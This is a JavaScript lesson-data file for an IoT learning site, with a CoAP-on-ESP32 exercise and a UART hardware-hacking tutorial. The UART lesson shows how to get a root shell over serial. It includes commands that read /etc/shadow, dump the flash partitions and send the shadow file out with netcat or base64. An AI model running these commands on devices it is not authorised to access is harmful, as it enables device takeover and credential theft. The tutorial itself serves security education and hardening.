            '<rect x="55" y="174" width="170" height="18" rx="3" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="0.5"/>' +
            '<text x="62" y="186" fill="#22c55e" font-size="7">/temperature  [GET]</text>' +
            '<rect x="55" y="196" width="170" height="18" rx="3" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="0.5"/>' +
            '<text x="62" y="208" fill="#22c55e" font-size="7">/info     [GET]</text>' +
            '<rect x="55" y="218" width="170" height="18" rx="3" fill="rgba(249,115,22,0.08)" stroke="rgba(249,115,22,0.3)" stroke-width="0.5"/>' +
            '<text x="62" y="230" fill="#f97316" font-size="7">/.well-known/core [GET]</text>' +

            '<!-- LED indicator -->' +
            '<circle cx="140" cy="260" r="8" style="animation:sg71-led 2s ease-in-out infinite" stroke="#22c55e" stroke-width="1"/>' +
            '<text x="160" y="264" fill="#8b949e" font-size="7">LED (GPIO 2)</text>' +

            '<!-- CoAP Client (Computer) -->' +
            '<rect x="360" y="80" width="200" height="140" rx="8" fill="#1e2736" stroke="#a855f7" stroke-width="1.5"/>' +
            '<rect x="360" y="80" width="200" height="24" rx="8" fill="rgba(168,85,247,0.12)"/>' +
            '<rect x="360" y="96" width="200" height="8" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="460" y="96" text-anchor="middle" fill="#c084fc" font-size="10" font-weight="600">CoAP CLIENT</text>' +
            '<text x="460" y="122" text-anchor="middle" fill="#8b949e" font-size="7">Python + aiocoap</text>' +
            '<text x="460" y="140" text-anchor="middle" fill="#8b949e" font-size="7">GET coap://ESP32/.well-known/core</text>' +
            '<text x="460" y="156" text-anchor="middle" fill="#8b949e" font-size="7">PUT coap://ESP32/light  payload: 1</text>' +
            '<text x="460" y="172" text-anchor="middle" fill="#8b949e" font-size="7">GET coap://ESP32/temperature</text>' +
            '<text x="460" y="192" text-anchor="middle" fill="#22c55e" font-size="7">Response: 2.05 Content</text>' +
            '<text x="460" y="208" text-anchor="middle" fill="#22c55e" font-size="7">Response: 2.04 Changed</text>' +

            '<!-- UDP Wires -->' +
            '<line x1="240" y1="140" x2="360" y2="140" stroke="#a855f7" stroke-width="1.5" stroke-dasharray="8,4" style="animation:sg71-udp 1.5s linear infinite"/>' +
            '<text x="300" y="132" text-anchor="middle" fill="#a855f7" font-size="7">UDP :5683</text>' +
            '<line x1="360" y1="170" x2="240" y2="170" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="8,4" style="animation:sg71-udp 1.5s linear infinite;animation-delay:0.5s"/>' +
            '<text x="300" y="182" text-anchor="middle" fill="#22c55e" font-size="7">ACK + payload</text>' +

            '<!-- Protocol comparison -->' +
            '<rect x="360" y="250" width="200" height="110" rx="8" fill="#1e2736" stroke="#f97316" stroke-width="1"/>' +
            '<rect x="360" y="250" width="200" height="20" rx="8" fill="rgba(249,115,22,0.08)"/>' +
            '<text x="460" y="264" text-anchor="middle" fill="#fb923c" font-size="8" font-weight="600">CoAP vs HTTP</text>' +

            '<text x="375" y="284" fill="#8b949e" font-size="6">Transport:</text>' +
            '<text x="445" y="284" fill="#a855f7" font-size="6">UDP</text>' +
            '<text x="500" y="284" fill="#8b949e" font-size="6">vs TCP</text>' +
            '<text x="375" y="298" fill="#8b949e" font-size="6">Header:</text>' +
            '<text x="445" y="298" fill="#22c55e" font-size="6">4 bytes</text>' +
            '<text x="500" y="298" fill="#ef4444" font-size="6">vs 100s</text>' +
            '<text x="375" y="312" fill="#8b949e" font-size="6">Secure:</text>' +
            '<text x="445" y="312" fill="#a855f7" font-size="6">DTLS :5684</text>' +
            '<text x="375" y="326" fill="#8b949e" font-size="6">Methods:</text>' +
            '<text x="445" y="326" fill="#8b949e" font-size="6">GET PUT POST DEL</text>' +
            '<text x="375" y="340" fill="#8b949e" font-size="6">Observe:</text>' +
            '<text x="445" y="340" fill="#22c55e" font-size="6">Push updates</text>' +

            '<!-- WiFi cloud -->' +
            '<rect x="40" y="310" width="280" height="50" rx="6" fill="rgba(168,85,247,0.06)" stroke="rgba(168,85,247,0.2)" stroke-width="0.5"/>' +
            '<text x="50" y="328" fill="#c084fc" font-size="8" font-weight="600">WiFi NETWORK</text>' +
            '<text x="50" y="344" fill="#8b949e" font-size="7">ESP32 and client on same LAN (192.168.1.0/24)</text>' +

            '</svg>' +
            '</div>', steps: [ { title: 'Set Up CoAP Server on ESP32', content: '<p>Flash the ESP32 with a CoAP server that exposes sensor data as resources.</p>', code: '# Using Arduino IDE or PlatformIO\n# Install CoAP library: coap-simple\n\n# Example CoAP server sketch (Arduino):\ncat << \'ARDEOF\'\n#include <WiFi.h>\n#include <coap-simple.h>\n\nWiFiUDP udp;\nCoap coap(udp);\n\nvoid callback_light(CoapPacket &packet, IPAddress ip, int port) {\n  char p[packet.payloadlen + 1];\n  memcpy(p, packet.payload, packet.payloadlen);\n  p[packet.payloadlen] = 0;\n  \n  if (strcmp(p, "1") == 0) {\n    digitalWrite(LED_BUILTIN, HIGH);\n    coap.sendResponse(ip, port, packet.messageid, "LED ON");\n  } else {\n    digitalWrite(LED_BUILTIN, LOW);\n    coap.sendResponse(ip, port, packet.messageid, "LED OFF");\n  }\n}\n\nvoid setup() {\n  WiFi.begin("YourSSID", "YourPassword");\n  while (WiFi.status() != WL_CONNECTED) delay(500);\n  Serial.println(WiFi.localIP());\n  \n  coap.server(callback_light, "light");\n  coap.start();\n}\n\nvoid loop() { coap.loop(); }\nARDEOF', language: 'Arduino', tip: null }, { title: 'Interact with CoAP Client', content: '<p>Send CoAP requests from your computer to the ESP32.</p>', code: '# Install CoAP client\npip3 install aiocoap\n\n# Discover resources\npython3 -c "\nimport asyncio\nfrom aiocoap import Context, Message, GET\n\nasync def main():\n    ctx = await Context.create_client_context()\n    msg = Message(code=GET, uri=\'coap://ESP32_IP/.well-known/core\')\n    resp = await ctx.request(msg).response\n    print(resp.payload.decode())\n\nasyncio.run(main())\n"\n\n# Turn LED on\npython3 -c "\nimport asyncio\nfrom aiocoap import Context, Message, PUT\n\nasync def main():\n    ctx = await Context.create_client_context()\n    msg = Message(code=PUT, uri=\'coap://ESP32_IP/light\', payload=b\'1\')\n    resp = await ctx.request(msg).response\n    print(resp.payload.decode())\n\nasyncio.run(main())\n"', language: 'Bash', tip: '<strong>Observe pattern:</strong> CoAP supports the Observe option — a client can subscribe to a resource and receive updates whenever it changes. This is the IoT equivalent of WebSocket push notifications, but over UDP with minimal overhead.' } ], testing: '<p><strong>Verification checklist:</strong></p><ul><li>CoAP server running on ESP32</li><li>Resource discovery works (.well-known/core)</li><li>GET/PUT requests successfully control LED</li><li>Can explain CoAP vs HTTP tradeoffs for IoT</li></ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>ESP32 CoAP server does not respond to requests:</strong> CoAP uses UDP port 5683. Check that the ESP32 is connected to WiFi (<code>Serial.println(WiFi.localIP())</code> should show a valid IP). Verify your client is targeting the correct IP and port. Unlike TCP, UDP failures are silent &mdash; there is no "connection refused" error. Use Wireshark with the <code>coap</code> filter to see if packets are actually reaching the ESP32.</li>' +
                         '<li><strong>aiocoap "TimeoutError" on every request:</strong> The ESP32 may have joined a different subnet or its IP changed. Re-check the IP from Serial Monitor. Also verify no firewall on your computer is blocking outbound UDP 5683. Some home routers block unusual UDP traffic between WiFi clients.</li>' +
                         '<li><strong>Resource discovery (.well-known/core) returns empty:</strong> Resources must be registered with <code>coap.server(callback, "resourcename")</code> before <code>coap.start()</code> is called. If you register after starting, the resource list is already built. Restart the ESP32 after adding new resources.</li>' +
                         '<li><strong>PUT request does not change LED state:</strong> Verify the payload is being parsed correctly in the callback. Add <code>Serial.println(p)</code> to debug the received payload. Common issues: payload contains trailing newline or null bytes, or the comparison is case-sensitive ("ON" vs "1").</li>' +
                         '<li><strong>coap-simple library compilation errors:</strong> Ensure you have the correct library version for your ESP32 board package. Some CoAP libraries conflict with newer ESP32 Arduino Core versions. Check the library manager for updates or use an alternative like <code>microcoap</code>.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Multi-Resource Server</strong> &mdash; Expand the CoAP server to expose multiple resources: <code>/temperature</code> (returns a sensor reading), <code>/led</code> (controls the LED), and <code>/info</code> (returns device name, uptime, and free heap memory). Implement proper CoAP response codes (2.05 Content for GET, 2.04 Changed for PUT).</p>' +
                    '<p><strong>Challenge 2: CoAP vs MQTT Benchmark</strong> &mdash; Implement the same sensor reporting system using both CoAP and MQTT (from SG-63). Send 1000 sensor readings using each protocol and measure: total bytes transmitted (use Wireshark), round-trip latency, and packet loss rate. Document the tradeoffs for battery-powered vs. always-on devices.</p>' +
                    '<p><strong>Challenge 3: DTLS Security Layer</strong> &mdash; Research and implement DTLS (Datagram TLS) on the CoAP server to encrypt communications on port 5684. Use pre-shared keys (PSK) for authentication. Capture traffic with Wireshark and verify that CoAP payloads are no longer visible in plaintext. Compare the overhead of DTLS vs. unencrypted CoAP.</p>',

        commonMistakes: [
            {
                title: 'Using TCP-Based Tools to Test CoAP',
                correct: 'Use CoAP-specific tools like <code>aiocoap</code>, <code>coap-client</code> (from libcoap), or <code>copper</code> (Firefox plugin). CoAP uses UDP, not TCP.',
                incorrect: 'Trying to access the CoAP server with <code>curl</code>, a web browser, or other HTTP/TCP tools on port 5683.',
                consequence: 'TCP tools send SYN packets that the CoAP server ignores entirely. You get connection timeouts and assume the server is down when it is running perfectly &mdash; just listening for UDP, not TCP.'
            },
            {
                title: 'Assuming CoAP Reliability Works Like TCP',
                correct: 'CoAP Confirmable (CON) messages provide basic reliability via acknowledgements and retransmissions, but it is not equivalent to TCP. Non-confirmable (NON) messages have no delivery guarantee at all.',
                incorrect: 'Sending CoAP NON (non-confirmable) messages and expecting every single one to arrive reliably.',
                consequence: 'UDP packets can be dropped, reordered, or duplicated. If your application requires guaranteed delivery (sensor alarms, lock commands), you must use CON messages and handle the ACK/timeout logic. Missed commands in a security system could be catastrophic.'
            },
            {
                title: 'Hardcoding WiFi Credentials in Published Code',
                correct: 'Use a separate <code>credentials.h</code> file excluded from version control, or use WiFiManager to configure credentials at runtime via a setup portal.',
                incorrect: 'Committing the Arduino sketch with your actual WiFi SSID and password in the <code>WiFi.begin("MyNetwork", "MyPassword")</code> call.',
                consequence: 'Your WiFi credentials are exposed in any shared code, GitHub repository, or screenshot. Anyone with these credentials can join your network.'
            }
        ] },

    'sg-72': {
        // Wokwi wave 4: NO SIM — real UART on a real target device.
        simulator: { available: false, note: 'UART/serial hacking means wiring to the <strong>physical TX/RX/GND pads</strong> of a real target device and reading its console &mdash; the whole exercise is the real hardware interface. Learn the pinout-hunting and baud-detection method here; do it on a real board.' }, intro: '<p>UART (Universal Asynchronous Receiver-Transmitter) is the serial interface found on almost every embedded device. IoT devices, routers, and embedded systems expose UART pads on their circuit boards for debugging and manufacturing. With a $3 USB-to-TTL adapter, you can connect to the UART console and often get a root shell &mdash; bypassing all software security.</p>', wiring: '    USB-to-TTL adapter -> UART pads on target device (TX, RX, GND)', wiringNotes: '<p><strong>Voltage:</strong> Most IoT devices use 3.3V logic. Your USB-to-TTL adapter must support 3.3V. Using a 5V adapter on a 3.3V device can damage it permanently. Check the adapter voltage setting before connecting.</p>', wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg72-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg72-serial{0%{stroke-dashoffset:10}100%{stroke-dashoffset:0}}' +
            '@keyframes sg72-cursor{0%,100%{opacity:1}50%{opacity:0}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg72-grid)" rx="4"/>' +
            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-72 UART HARDWARE HACKING</text>' +

            '<!-- Target IoT Device PCB -->' +
            '<rect x="380" y="60" width="300" height="200" rx="8" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="380" y="60" width="300" height="24" rx="8" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="380" y="76" width="300" height="8" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="530" y="76" text-anchor="middle" fill="#4ade80" font-size="10" font-weight="600">TARGET DEVICE PCB</text>' +

            '<!-- Main SoC chip -->' +
            '<rect x="460" y="110" width="100" height="60" rx="4" fill="#1a1f2b" stroke="#8b949e" stroke-width="1"/>' +
            '<text x="510" y="138" text-anchor="middle" fill="#8b949e" font-size="8">SoC</text>' +
            '<text x="510" y="152" text-anchor="middle" fill="#8b949e" font-size="6">ARM / MIPS</text>' +
            '<text x="510" y="164" text-anchor="middle" fill="#8b949e" font-size="6">Linux 4.x</text>' +

            '<!-- UART test pads -->' +
            '<text x="420" y="200" fill="#f97316" font-size="7" font-weight="600">UART PADS</text>' +
            '<circle cx="420" cy="215" r="5" fill="#1a1f2b" stroke="#ef4444" stroke-width="1.5"/>' +
            '<text x="420" y="232" text-anchor="middle" fill="#ef4444" font-size="6">VCC</text>' +
            '<circle cx="450" cy="215" r="5" fill="#1a1f2b" stroke="#f97316" stroke-width="1.5"/>' +
            '<text x="450" y="232" text-anchor="middle" fill="#f97316" font-size="6">TX</text>' +
            '<circle cx="480" cy="215" r="5" fill="#1a1f2b" stroke="#22c55e" stroke-width="1.5"/>' +
            '<text x="480" y="232" text-anchor="middle" fill="#22c55e" font-size="6">RX</text>' +
            '<circle cx="510" cy="215" r="5" fill="#1a1f2b" stroke="#8b949e" stroke-width="1.5"/>' +
            '<text x="510" y="232" text-anchor="middle" fill="#8b949e" font-size="6">GND</text>' +

            '<!-- Flash chip -->' +
            '<rect x="590" y="130" width="60" height="30" rx="3" fill="#1a1f2b" stroke="#8b949e" stroke-width="0.5"/>' +
            '<text x="620" y="148" text-anchor="middle" fill="#8b949e" font-size="6">FLASH</text>' +
            '<text x="620" y="158" text-anchor="middle" fill="#8b949e" font-size="5">16MB SPI</text>' +

            '<!-- Power connector -->' +
            '<rect x="646" y="90" width="28" height="16" rx="2" fill="#1a1f2b" stroke="#ef4444" stroke-width="0.5"/>' +
            '<text x="660" y="102" text-anchor="middle" fill="#ef4444" font-size="5">PWR</text>' +

            '<!-- USB-to-TTL Adapter -->' +
            '<rect x="40" y="100" width="180" height="120" rx="8" fill="#1e2736" stroke="#a855f7" stroke-width="1.5"/>' +
            '<rect x="40" y="100" width="180" height="24" rx="8" fill="rgba(168,85,247,0.12)"/>' +
            '<rect x="40" y="116" width="180" height="8" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="130" y="116" text-anchor="middle" fill="#c084fc" font-size="9" font-weight="600">USB-TO-TTL ADAPTER</text>' +
            '<text x="130" y="140" text-anchor="middle" fill="#8b949e" font-size="7">CH340 / FTDI / CP2102</text>' +
            '<text x="130" y="158" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">3.3V MODE!</text>' +

            '<!-- Adapter pins -->' +
            '<text x="210" y="180" text-anchor="end" fill="#8b949e" font-size="7">GND</text>' +
            '<circle cx="218" cy="177" r="3" fill="#1a1f2b" stroke="#8b949e" stroke-width="1"/>' +
            '<text x="210" y="196" text-anchor="end" fill="#f97316" font-size="7">TX</text>' +
            '<circle cx="218" cy="193" r="3" fill="#1a1f2b" stroke="#f97316" stroke-width="1"/>' +
            '<text x="210" y="212" text-anchor="end" fill="#22c55e" font-size="7">RX</text>' +
            '<circle cx="218" cy="209" r="3" fill="#1a1f2b" stroke="#22c55e" stroke-width="1"/>' +
            '<!-- USB to computer -->' +
            '<rect x="16" y="130" width="28" height="18" rx="3" fill="#1a1f2b" stroke="#a855f7" stroke-width="1"/>' +
            '<text x="30" y="142" text-anchor="middle" fill="#a855f7" font-size="5">USB</text>' +

            '<!-- Wires — TX/RX crossover -->' +
            '<line x1="221" y1="177" x2="510" y2="215" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="6,3"/>' +
            '<text x="350" y="198" text-anchor="middle" fill="#8b949e" font-size="6">GND &#8594; GND</text>' +
            '<!-- TX to RX (cross!) -->' +
            '<line x1="221" y1="193" x2="480" y2="215" stroke="#f97316" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg72-serial 1s linear infinite"/>' +
            '<text x="340" y="212" text-anchor="middle" fill="#f97316" font-size="6">TX &#8594; RX (cross!)</text>' +
            '<!-- RX to TX (cross!) -->' +
            '<line x1="221" y1="209" x2="450" y2="215" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg72-serial 1s linear infinite;animation-delay:0.3s"/>' +
            '<text x="328" y="226" text-anchor="middle" fill="#22c55e" font-size="6">RX &#8594; TX (cross!)</text>' +

            '<!-- Serial Terminal Output -->' +
            '<rect x="40" y="270" width="640" height="100" rx="8" fill="#0a0e14" stroke="#3b82f6" stroke-width="1"/>' +
            '<text x="50" y="288" fill="#60a5fa" font-size="8" font-weight="600">screen /dev/ttyUSB0 115200</text>' +
            '<text x="50" y="304" fill="#22c55e" font-size="7">U-Boot 2019.07 (Oct 15 2020)</text>' +
            '<text x="50" y="318" fill="#8b949e" font-size="7">Starting kernel ... Linux version 4.14.90</text>' +
            '<text x="50" y="332" fill="#8b949e" font-size="7">Mounting root filesystem... done</text>' +
            '<text x="50" y="346" fill="#22c55e" font-size="7">BusyBox v1.27.2 built-in shell (ash)</text>' +
            '<text x="50" y="360" fill="#ef4444" font-size="8" font-weight="600">root@device:~#</text>' +
            '<rect x="168" y="351" width="7" height="10" fill="#ef4444" style="animation:sg72-cursor 1s step-end infinite"/>' +
            '<text x="400" y="360" fill="#ef4444" font-size="7">ROOT SHELL — no password required</text>' +

            '</svg>' +
            '</div>', steps: [ { title: 'Identify UART Pins', content: '<p>Open the target device and find the UART test pads on the PCB.</p>', code: '# UART pads are usually:\n# - 3 or 4 pads in a row (TX, RX, GND, sometimes VCC)\n# - Near the main processor chip\n# - Sometimes labeled (TX, RX, GND)\n# - Sometimes unlabeled (use a multimeter to identify)\n\n# Identify GND:\n# Use multimeter continuity mode\n# One probe on a known ground (USB shield, battery negative)\n# Touch each pad — the one that beeps is GND\n\n# Identify TX:\n# Set multimeter to DC voltage\n# Power on the device\n# The TX pin will show voltage fluctuations (data being sent)\n# It is typically 3.3V when idle\n\n# Identify RX:\n# The remaining data pin is RX\n# RX is an input — it does not output voltage when idle', language: 'Bash', tip: '<strong>No soldering required:</strong> For testing, you can hold dupont jumper wires against the pads. For a permanent connection, solder header pins to the pads. Some devices have through-hole pads (easy to solder), others have surface-mount pads (harder).' }, { title: 'Connect and Access Console', content: '<p>Connect the USB-to-TTL adapter and open a serial terminal.</p>', code: '# Connect wires:\n# Adapter GND -> Device GND\n# Adapter TX  -> Device RX\n# Adapter RX  -> Device TX\n# (TX and RX cross over — your TX goes to their RX)\n\n# Find the serial device\nls /dev/ttyUSB* /dev/ttyACM*\n\n# Connect with screen (common baud rates: 115200, 9600, 57600)\nscreen /dev/ttyUSB0 115200\n\n# Or use minicom:\nminicom -D /dev/ttyUSB0 -b 115200\n\n# Power on the device — you should see boot messages\n# Many devices drop to a shell prompt:\n# root@device:~#\n# You now have root access to the device\n\n# If you see garbled text, try a different baud rate:\n# 9600, 19200, 38400, 57600, 115200\n# The correct baud rate produces readable ASCII text', language: 'Bash', tip: '<strong>Baud rate detection:</strong> If you do not know the baud rate, use the <code>baudrate.py</code> tool from the devttys0 project, or try common rates starting with 115200 (most common for modern devices) and 9600 (legacy devices). Wrong baud rate = garbled output.' }, { title: 'Extract Information', content: '<p>Once on the console, explore the filesystem and extract useful information.</p>', code: '# Common commands once you have a shell:\nuname -a              # Kernel version\ncat /proc/cpuinfo     # CPU info\ncat /etc/passwd       # User accounts\ncat /etc/shadow       # Password hashes (if readable)\nifconfig              # Network interfaces\nps                    # Running processes\nmount                 # Mounted filesystems\ncat /proc/mtd         # Flash memory partitions\n\n# Dump the firmware from flash (if dd is available):\ncat /dev/mtdblock0 > /tmp/bootloader.bin\ncat /dev/mtdblock1 > /tmp/kernel.bin\ncat /dev/mtdblock2 > /tmp/rootfs.bin\n\n# Transfer files out via tftp/netcat/base64:\n# If netcat is available:\nnc -l -p 9999 < /etc/shadow\n# On your computer: nc DEVICE_IP 9999 > shadow.txt\n\n# If only base64 is available:\nbase64 /etc/shadow\n# Copy output, decode on your computer:\n# echo "BASE64_DATA" | base64 -d > shadow.txt', language: 'Bash', tip: '<strong>Physical access = game over:</strong> UART access gives you root shell on most IoT devices. No password, no authentication, just a direct serial console. This is why physical security matters &mdash; if an attacker can open the device, software security is irrelevant. The defense is to disable UART in production firmware or require authentication on the serial console.' } ], testing: '<p><strong>Verification checklist:</strong></p><ul><li>UART pins identified on target device PCB</li><li>USB-to-TTL adapter connected correctly (GND, TX, RX)</li><li>Boot messages visible in serial terminal</li><li>Shell access obtained (root prompt)</li><li>System information extracted (passwd, network config, processes)</li><li>Can explain why UART access bypasses software security</li></ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>Serial terminal shows garbled/unreadable characters:</strong> Wrong baud rate. Try the standard rates in order: 115200, 9600, 57600, 38400, 19200. The correct baud rate produces readable ASCII text. You can also use <code>baudrate.py</code> from the devttys0 toolkit to auto-detect the rate.</li>' +
                         '<li><strong>No output at all after connecting:</strong> Check wiring: TX/RX must be crossed (adapter TX to device RX, adapter RX to device TX). Verify GND is connected. If still nothing, the device may have UART disabled in production firmware &mdash; try sending a break signal or pressing Enter to trigger a login prompt.</li>' +
                         '<li><strong>Boot messages appear but no shell prompt:</strong> The manufacturer may have disabled the console login. You see the kernel boot log but the init system does not spawn a shell on the serial port. Look for U-Boot during early boot &mdash; you may be able to interrupt the bootloader by pressing a key within the first 1&ndash;3 seconds to access a recovery console.</li>' +
                         '<li><strong>USB-to-TTL adapter not detected (<code>/dev/ttyUSB*</code> missing):</strong> Install the driver for your adapter chip: <code>CH340</code> (most common cheap adapters) needs the <code>ch341</code> driver, <code>FTDI</code> needs <code>ftdi_sio</code>, <code>CP2102</code> needs <code>cp210x</code>. Check <code>dmesg | tail</code> after plugging in to see if the kernel recognizes the device.</li>' +
                         '<li><strong>"screen" or "minicom" shows nothing and appears frozen:</strong> The terminal program is waiting for data. Power cycle the target device &mdash; boot messages should appear. If using <code>screen</code>, exit with <code>Ctrl+A</code> then <code>K</code> (kill). If using <code>minicom</code>, exit with <code>Ctrl+A</code> then <code>X</code>.</li>' +
                         '<li><strong>Multimeter shows 5V on data pins instead of 3.3V:</strong> Stop. Do not connect a 3.3V adapter to 5V logic without a level shifter. Some devices (older Arduino boards, some industrial equipment) use 5V UART. Use a 5V-tolerant adapter or add a voltage divider on the RX line.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Automated UART Scanner</strong> &mdash; Write a Python script using <code>pyserial</code> that cycles through common baud rates (9600, 19200, 38400, 57600, 115200) and listens for readable ASCII on each. When it detects valid text output, it reports the correct baud rate and logs the captured data. This automates the most tedious part of UART hacking.</p>' +
                    '<p><strong>Challenge 2: U-Boot Exploitation</strong> &mdash; On a device you own that uses U-Boot (many routers and IP cameras), interrupt the bootloader during startup and explore the U-Boot command environment. Use <code>printenv</code> to dump environment variables (often containing boot arguments and recovery passwords). Use <code>md</code> (memory dump) to read memory contents. Document the full attack surface available from the bootloader.</p>' +
                    '<p><strong>Challenge 3: UART Defense Implementation</strong> &mdash; On a Raspberry Pi, configure the serial console to require authentication (add a login prompt via <code>getty</code> instead of auto-login). Then go further: disable UART entirely in production by removing the console kernel parameter. Document the full hardening process and test that UART access is no longer possible without re-enabling it.</p>',

        commonMistakes: [
            {
                title: 'Connecting TX to TX and RX to RX',
                correct: 'Cross the connections: adapter TX connects to device RX, and adapter RX connects to device TX. Data transmitted by one side must be received by the other.',
                incorrect: 'Connecting adapter TX to device TX and adapter RX to device RX (matching labels together).',
                consequence: 'No communication occurs. Both TX pins are transmitting into each other and neither side is receiving. This is the most common UART wiring mistake. The fix is simple: swap the TX and RX wires.'
            },
            {
                title: 'Connecting VCC from Adapter to Device',
                correct: 'Only connect GND, TX, and RX. Let the target device power itself from its own power supply. The VCC pin on the adapter is for reference voltage, not for powering the target.',
                incorrect: 'Connecting the adapter VCC pin to the device VCC pad, attempting to power the device through the serial adapter.',
                consequence: 'The USB-to-TTL adapter cannot supply enough current to power most IoT devices. Attempting this can damage the adapter, the USB port, or the target device. The device should be powered by its normal power source while you connect only the serial data lines.'
            },
            {
                title: 'Using 5V Logic on a 3.3V Device',
                correct: 'Verify the target device logic level with a multimeter before connecting. Set the USB-to-TTL adapter to 3.3V mode (most have a jumper or switch). If no voltage selection exists, use a level shifter.',
                incorrect: 'Connecting a 5V USB-to-TTL adapter to a device with 3.3V logic levels without checking voltage compatibility.',
                consequence: 'The 5V signal exceeds the absolute maximum rating of 3.3V chips. This can permanently destroy the UART peripheral or the entire SoC. The device becomes bricked with no recovery path. Always measure before connecting.'
            }
        ] }
};